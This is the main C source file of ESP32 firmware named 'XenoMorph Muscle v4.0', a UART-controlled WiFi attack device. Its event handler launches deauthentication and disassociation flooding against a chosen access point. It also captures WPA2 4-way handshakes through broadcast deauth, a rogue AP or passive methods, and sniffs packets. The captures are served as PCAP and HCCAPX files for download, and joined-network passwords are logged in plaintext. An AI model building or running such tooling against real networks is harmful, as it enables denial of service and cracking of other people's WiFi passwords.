/**
 * @file main.c
 * @brief XenoMorph Muscle v4.0
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "driver/uart.h"

#include "attack.h"
#include "attack_dos.h"
#include "attack_handshake.h"
#include "attack_sniff.h"
#include "attack_join.h"
#include "wifi_controller.h"
#include "xenomorph_uart.h"
#include "xenomorph_protocol.h"
#include "hccapx_serializer.h"
#include "webserver.h"

static const char *TAG = "main";

static attack_config_t current_attack_config;
static wifi_ap_record_t current_ap_record;
static bool attack_running = false;
static bool sniff_running = false;

static uint32_t g_frames_sent = 0;
static uint32_t g_attack_start_time = 0;

// Handshake state tracking
static bool handshake_running = false;
static uint32_t g_handshake_start_time = 0;

// Forward declarations
void send_ready_notification();
void send_heartbeat();
static void status_report_task(void *pvParameters);
static void handshake_progress_task(void *pvParameters);
static void ensure_channel_switch(uint8_t target_channel);
static void join_network_from_uart(const xeno_join_params_t *params);

// After sniff/handshake stops while in joined state, restore
// APSTA mode + original AP MAC + ManagementAP so user can reach
// 192.168.4.1 to download the captured file.
static void restore_mgmt_ap_after_join(void);

void send_ready_notification()
{
    uint8_t frame[16];
    uint16_t pos = 0;

    frame[pos++] = XENO_SYNC_RSP;
    frame[pos++] = XENO_NOTIFY_READY;
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    frame[pos++] = xeno_checksum(frame, 4);

    uart_write_bytes(XENO_UART_NUM, (const char *)frame, pos);
    ESP_LOGI(TAG, "Sent READY notification");
}

void send_heartbeat()
{
    uint8_t frame[16];
    uint16_t pos = 0;

    frame[pos++] = XENO_SYNC_RSP;
    frame[pos++] = XENO_NOTIFY_ATTACKING;
    frame[pos++] = 0x01;
    frame[pos++] = 0x00;
    frame[pos++] = (attack_running || sniff_running || attack_join_is_joined()) ? 0x01 : 0x00;
    frame[pos++] = xeno_checksum(frame, 5);

    uart_write_bytes(XENO_UART_NUM, (const char *)frame, pos);
}

static void status_report_task(void *pvParameters)
{
    vTaskDelay(pdMS_TO_TICKS(500));
    send_ready_notification();

    while (1)
    {
        vTaskDelay(pdMS_TO_TICKS(3000));
        send_heartbeat();
    }
}

// Handshake progress reporter — polls HCCAPX every 1 second and notifies
// the Commander of message-pair progress. When 4-way is complete, sends DONE.
static void handshake_progress_task(void *pvParameters)
{
    ESP_LOGI(TAG, "Handshake progress task started");

    while (handshake_running)
    {
        vTaskDelay(pdMS_TO_TICKS(1000));

        if (!handshake_running) break;

        hccapx_t *hccapx = hccapx_serializer_get();
        uint8_t mp = (hccapx != NULL) ? hccapx->message_pair : 255;

        uint32_t elapsed = ((xTaskGetTickCount() * portTICK_PERIOD_MS) / 1000)
                           - g_handshake_start_time;
        if (elapsed > 0xFFFF) elapsed = 0xFFFF;

        // mp=4 = complete 4-way handshake (M1+M2+M3+M4) — the ONLY valid complete state
        bool complete = (mp == 4);

        xeno_handshake_progress_t hs_prog = {
            .message_pair = mp,
            .channel = current_ap_record.primary,
            .elapsed_sec = (uint16_t)elapsed,
            .ready = complete ? 1 : 0
        };

        if (complete)
        {
            ESP_LOGI(TAG, "Handshake complete! mp=%d elapsed=%u",
                     mp, (unsigned)elapsed);
            xeno_uart_send_notification(XENO_NOTIFY_HS_DONE,
                                        (uint8_t *)&hs_prog, sizeof(hs_prog));

            // Stop deauth/sniffer/frame_analyzer infrastructure
            attack_handshake_stop();

            // If we had previously joined a network, restore ManagementAP
            restore_mgmt_ap_after_join();

            // DOWNLOAD_READY notification — the unified webserver already serves /hccapx
            xeno_uart_send_notification(0x24, NULL, 0);
            handshake_running = false;
            break;
        }
        else
        {
            xeno_uart_send_notification(XENO_NOTIFY_HS_PROGRESS,
                                        (uint8_t *)&hs_prog, sizeof(hs_prog));
        }
    }

    ESP_LOGI(TAG, "Handshake progress task exiting");
    vTaskDelete(NULL);
}

/* ========== Join Network Handler ========== */

static void restore_mgmt_ap_after_join(void)
{
    if (!attack_join_is_joined()) {
        return;
    }

    ESP_LOGI(TAG, "Joined state active — restoring ManagementAP for download...");

    esp_err_t mr = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (mr != ESP_OK) {
        ESP_LOGE(TAG, "restore_mgmt_ap: set_mode(APSTA) failed: 0x%x", mr);
    }

    wifictl_restore_ap_mac();
    wifictl_mgmt_ap_start();

    ESP_LOGI(TAG, "ManagementAP restored at 192.168.4.1");
}

static void join_network_from_uart(const xeno_join_params_t *params)
{
    if (attack_join_is_joined() || attack_join_is_joining()) {
        ESP_LOGW(TAG, "Already joined or joining — disconnect first");
        xeno_uart_send_status(XENO_STATUS_ERR, "Already joined — disconnect first");
        return;
    }

    if (params->password[0] == '\0') {
        ESP_LOGE(TAG, "Join: empty password");
        xeno_uart_send_status(XENO_STATUS_ERR, "Empty password");
        xeno_uart_send_notification(XENO_NOTIFY_JOIN_FAIL, NULL, 0);
        return;
    }

    // Stop any running attack or sniff before joining
    if (attack_running) {
        ESP_LOGW(TAG, "Stopping previous attack for join");
        attack_dos_stop();
        attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (sniff_running) {
        ESP_LOGW(TAG, "Stopping previous sniff for join");
        attack_sniff_stop(NULL, NULL);
        sniff_running = false;
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (handshake_running) {
        ESP_LOGW(TAG, "Stopping previous handshake for join");
        attack_handshake_stop();
        handshake_running = false;
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    // Restore AP MAC FIRST (RogueAP changed it to target BSSID)
    ESP_LOGI(TAG, "Join: restoring AP MAC");
    wifictl_restore_ap_mac();

    // Switch to STA-only mode to avoid rogue AP MAC conflict
    ESP_LOGI(TAG, "Join: switching to STA-only mode");
    esp_wifi_set_mode(WIFI_MODE_STA);

    ESP_LOGI(TAG, "Join: SSID='%s' CH=%d PW='%s'", params->ssid, params->channel, params->password);

    xeno_uart_send_status(XENO_STATUS_OK, "Joining network...");

    esp_err_t ret = attack_join_start(params);
    if (ret != ESP_OK) {
        xeno_uart_send_status(XENO_STATUS_ERR, "Failed to start join");
        xeno_uart_send_notification(XENO_NOTIFY_JOIN_FAIL, NULL, 0);
        return;
    }
}

void ensure_channel_switch(uint8_t target_channel)
{
    uint8_t current_channel;
    wifi_second_chan_t second;

    esp_wifi_get_channel(&current_channel, &second);
    ESP_LOGI(TAG, "Current WiFi channel: %d, Target: %d", current_channel, target_channel);

    if (current_channel != target_channel)
    {
        ESP_LOGI(TAG, "Switching to channel %d...", target_channel);
        esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_wifi_get_channel(&current_channel, &second);
        ESP_LOGI(TAG, "Channel now: %d", current_channel);
    }
}

static void xeno_uart_event_handler(void *args, esp_event_base_t event_base,
                                    int32_t event_id, void *event_data)
{
    switch (event_id)
    {
    case XENO_UART_EVENT_START_ATTACK:
    {
        xeno_attack_params_t *params = (xeno_attack_params_t *)event_data;

        if (attack_running || sniff_running)
        {
            ESP_LOGW(TAG, "Stopping previous operation");
            if (attack_running)
                attack_dos_stop();
            if (sniff_running)
            {
                attack_sniff_stop(NULL, NULL);
            }
            attack_running = false;
            sniff_running = false;
            vTaskDelay(pdMS_TO_TICKS(500));
        }

        memset(&current_ap_record, 0, sizeof(current_ap_record));
        strncpy((char *)current_ap_record.ssid, params->ssid, 32);
        memcpy(current_ap_record.bssid, params->bssid, 6);
        current_ap_record.primary = params->channel;
        current_ap_record.authmode = WIFI_AUTH_WPA2_PSK;

        current_attack_config.type = ATTACK_TYPE_DOS;
        current_attack_config.timeout = params->timeout;
        current_attack_config.ap_record = &current_ap_record;
        current_attack_config.method = ATTACK_DOS_METHOD_COMBINE_ALL;

        ESP_LOGI(TAG, "Using COMBINE_ALL method");
        ensure_channel_switch(params->channel);

        g_frames_sent = 0;
        g_attack_start_time = (xTaskGetTickCount() * portTICK_PERIOD_MS) / 1000;

        attack_update_status(RUNNING);
        attack_dos_start(&current_attack_config);
        attack_running = true;

        ESP_LOGI(TAG, "========================================");
        ESP_LOGI(TAG, "COMBINE ATTACK STARTED (aggressive multi-frame)");
        ESP_LOGI(TAG, "SSID: %s", params->ssid);
        ESP_LOGI(TAG, "Channel: %d", params->channel);
        ESP_LOGI(TAG, "Mode: deauth(r2)+deauth(r7)+disassoc(r7) per tick @ 10Hz (30 frames/sec)");
        ESP_LOGI(TAG, "========================================");

        xeno_uart_send_status(XENO_STATUS_OK, "COMBINE attack started");
        break;
    }

    case XENO_UART_EVENT_STOP_ATTACK:
    {
        if (attack_running)
        {
            ESP_LOGI(TAG, "Stopping attack...");
            attack_dos_stop();
            attack_update_status(READY);
            attack_running = false;
            ESP_LOGI(TAG, "Attack STOPPED");
            xeno_uart_send_status(XENO_STATUS_OK, "Attack stopped");
        }
        else
        {
            xeno_uart_send_status(XENO_STATUS_IDLE, "No attack running");
        }
        break;
    }

    case XENO_UART_EVENT_STATUS_REQ:
    {
        uint8_t status = (attack_running || sniff_running) ? XENO_STATUS_RUN : XENO_STATUS_IDLE;
        const char *msg = attack_running ? "COMBINE active" : sniff_running ? "Sniffing active"
                                                                            : "Idle";
        xeno_uart_send_status(status, msg);
        break;
    }

    case XENO_UART_EVENT_START_HANDSHAKE:
    {
        xeno_handshake_params_t *params = (xeno_handshake_params_t *)event_data;

        // Stop any conflicting operation
        if (attack_running)
        {
            ESP_LOGW(TAG, "Stopping previous attack");
            attack_dos_stop();
            attack_running = false;
        }
        if (sniff_running)
        {
            ESP_LOGW(TAG, "Stopping previous sniff");
            attack_sniff_stop(NULL, NULL);
            sniff_running = false;
        }
        handshake_running = false;       // stop progress task if stuck
        vTaskDelay(pdMS_TO_TICKS(500));

        memset(&current_ap_record, 0, sizeof(current_ap_record));
        strncpy((char *)current_ap_record.ssid, params->ssid, 32);
        memcpy(current_ap_record.bssid, params->bssid, 6);
        current_ap_record.primary = params->channel;
        current_ap_record.authmode = WIFI_AUTH_WPA2_PSK;

        current_attack_config.type = ATTACK_TYPE_HANDSHAKE;
        current_attack_config.timeout = params->timeout;
        current_attack_config.ap_record = &current_ap_record;

        switch(params->method){
            case 0x01: current_attack_config.method = ATTACK_HANDSHAKE_METHOD_BROADCAST; break;
            case 0x02: current_attack_config.method = ATTACK_HANDSHAKE_METHOD_ROGUE_AP; break;
            case 0x03: current_attack_config.method = ATTACK_HANDSHAKE_METHOD_PASSIVE; break;
            default:   current_attack_config.method = ATTACK_HANDSHAKE_METHOD_BROADCAST; break;
        }

        ESP_LOGI(TAG, "Handshake attack method=%d timeout=%u",
                 current_attack_config.method, params->timeout);

        ensure_channel_switch(params->channel);

        g_frames_sent = 0;
        g_handshake_start_time = (xTaskGetTickCount() * portTICK_PERIOD_MS) / 1000;

        attack_update_status(RUNNING);
        attack_handshake_start(&current_attack_config);
        handshake_running = true;

        xTaskCreate(handshake_progress_task, "hs_progress", 4096, NULL, 5, NULL);

        xeno_handshake_progress_t hs_prog = {
            .message_pair = 0,
            .channel = params->channel,
            .elapsed_sec = 0,
            .ready = 0
        };
        xeno_uart_send_notification(XENO_NOTIFY_HS_START,
                                    (uint8_t *)&hs_prog, sizeof(hs_prog));

        ESP_LOGI(TAG, "========================================");
        ESP_LOGI(TAG, "HANDSHAKE CAPTURE STARTED");
        ESP_LOGI(TAG, "SSID: %s CH:%d method=%d",
                 params->ssid, params->channel, params->method);
        ESP_LOGI(TAG, "========================================");

        break;
    }

    case XENO_UART_EVENT_STOP_HANDSHAKE:
    {
        ESP_LOGW(TAG, "STOP_HANDSHAKE — user cancelled");
        handshake_running = false;
        attack_handshake_stop();
        restore_mgmt_ap_after_join();

        xeno_handshake_progress_t hs_prog = {
            .message_pair = XENO_HS_FAILED,
            .channel = 0,
            .elapsed_sec = 0,
            .ready = 0
        };
        xeno_uart_send_notification(XENO_NOTIFY_HS_FAILED,
                                    (uint8_t *)&hs_prog, sizeof(hs_prog));

        xeno_uart_send_status(XENO_STATUS_IDLE, "Handshake cancelled");
        break;
    }

    case XENO_UART_EVENT_START_SNIFF:
    {
        xeno_sniff_params_t *params = (xeno_sniff_params_t *)event_data;

        if (attack_running || sniff_running)
        {
            ESP_LOGW(TAG, "Stopping previous operation");
            if (attack_running)
                attack_dos_stop();
            if (sniff_running)
            {
                attack_sniff_stop(NULL, NULL);
            }
            attack_running = false;
            sniff_running = false;
            vTaskDelay(pdMS_TO_TICKS(500));
        }

        ESP_LOGI(TAG, "========================================");
        ESP_LOGI(TAG, "STARTING SNIFFING MODE");
        ESP_LOGI(TAG, "Channel: %d, Method: %d", params->channel, params->sniff_method);
        ESP_LOGI(TAG, "========================================");

        ensure_channel_switch(params->channel);

        esp_err_t ret = attack_sniff_start(params->channel, params->bssid,
                                           params->sniff_method, params->max_packets);

        if (ret == ESP_OK)
        {
            sniff_running = true;
            xeno_uart_send_status(XENO_STATUS_OK, "Sniffing started");
        }
        else
        {
            xeno_uart_send_status(XENO_STATUS_ERR, "Failed to start sniffing");
        }
        break;
    }

    case XENO_UART_EVENT_STOP_SNIFF:
    {
        if (sniff_running)
        {
            uint32_t packets, buffer_size;
            ESP_LOGI(TAG, "Stopping sniffing...");

            esp_err_t ret = attack_sniff_stop(&packets, &buffer_size);
            sniff_running = false;

            xeno_uart_send_status(ret == ESP_OK ? XENO_STATUS_OK : XENO_STATUS_ERR,
                                  "Stopped");

            ESP_LOGI(TAG, "Sniffing STOPPED: %u packets, %u bytes", packets, buffer_size);

            // If we had previously joined a network (STA-only mode), bring
            // ManagementAP back up so 192.168.4.1/pcap is reachable.
            restore_mgmt_ap_after_join();

            // Download portal is always UP — no need to start/stop HTTP server.
            // 28 = sizeof(pcap_global_header_t) — pcap_serializer always writes this,
            // so anything beyond the header means at least one record was captured.
            if (buffer_size > 28) {
                xeno_uart_send_notification(0x24, NULL, 0); // DOWNLOAD_READY
                ESP_LOGI(TAG, "PCAP available — visit 192.168.4.1/ to download");
            } else {
                ESP_LOGI(TAG, "No PCAP data to serve (buffer_size=%u <= header-only)", buffer_size);
            }
        }
        else
        {
            xeno_uart_send_status(XENO_STATUS_IDLE, "No sniffing running");
        }
        break;
    }

    case XENO_UART_EVENT_JOIN_NETWORK:
    {
        xeno_join_params_t *params = (xeno_join_params_t *)event_data;
        join_network_from_uart(params);
        break;
    }

    case XENO_UART_EVENT_DISCONNECT_STA:
    {
        ESP_LOGI(TAG, "Disconnect STA requested");
        if (attack_join_is_joined()) {
            attack_join_disconnect();
            xeno_uart_send_status(XENO_STATUS_OK, "Disconnected from joined network");
        } else if (attack_running) {
            attack_dos_stop();
            attack_running = false;
            xeno_uart_send_status(XENO_STATUS_OK, "Attack stopped");
        } else if (sniff_running) {
            attack_sniff_stop(NULL, NULL);
            sniff_running = false;
            xeno_uart_send_status(XENO_STATUS_OK, "Sniffing stopped");
        } else {
            xeno_uart_send_status(XENO_STATUS_IDLE, "Nothing to disconnect");
        }
        break;
    }

    case XENO_UART_EVENT_PCAP_SIZE:
    {
        uint32_t packets, buffer_size;
        attack_sniff_get_stats(&packets, &buffer_size, NULL);

        ESP_LOGI(TAG, "PCAP size request: %u bytes", buffer_size);
        xeno_uart_send_response(XENO_STATUS_OK, (uint8_t *)&buffer_size, 4);
        break;
    }

    case XENO_UART_EVENT_PCAP_CHUNK:
    {
        xeno_pcap_req_t *req = (xeno_pcap_req_t *)event_data;

        uint8_t buffer[480];
        uint16_t read = 0;
        bool is_last = false;

        esp_err_t ret = attack_sniff_read_chunk(req->offset, buffer,
                                                req->chunk_size, &read, &is_last);

        if (ret == ESP_OK && read > 0)
        {
            xeno_uart_send_pcap_chunk(req->offset, buffer, read, is_last);
        }
        else
        {
            xeno_uart_send_pcap_chunk(req->offset, NULL, 0, true);
        }
        break;
    }
    }
}

void app_main(void)
{
    ESP_LOGI(TAG, "========================================");
    ESP_LOGI(TAG, "XenoMorph Muscle v4.0 - Unified Download Portal");
    ESP_LOGI(TAG, "Visit 192.168.4.1 — download /pcap and /hccapx");
    ESP_LOGI(TAG, "========================================");

    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // Start ManagementAP
    wifictl_mgmt_ap_start();

    // Start unified HTTP download portal (/, /pcap, /hccapx)
    webserver_run();

    // Initialize attack frameworks
    attack_init();
    attack_sniff_init();
    attack_join_init();

    // Initialize UART
    ESP_ERROR_CHECK(xeno_uart_init());

    // Register event handler
    ESP_ERROR_CHECK(esp_event_handler_register(XENO_UART_EVENTS, ESP_EVENT_ANY_ID,
                                               &xeno_uart_event_handler, NULL));

    // Start status task
    xTaskCreate(status_report_task, "status_task", 2048, NULL, 5, NULL);

    ESP_LOGI(TAG, "Muscle READY v4.0");
    ESP_LOGI(TAG, "Unified download portal: 192.168.4.1 — / for launcher, /pcap, /hccapx");
    ESP_LOGI(TAG, "Deauth: aggressive multi-frame mode (deauth+disassoc)");

    while (1)
    {
        vTaskDelay(pdMS_TO_TICKS(1000));

        if (attack_running)
        {
            const attack_status_t *status = attack_get_status();
            if (status->state == FINISHED || status->state == TIMEOUT)
            {
                ESP_LOGI(TAG, "Attack completed");
                attack_running = false;
            }
        }
    }
}
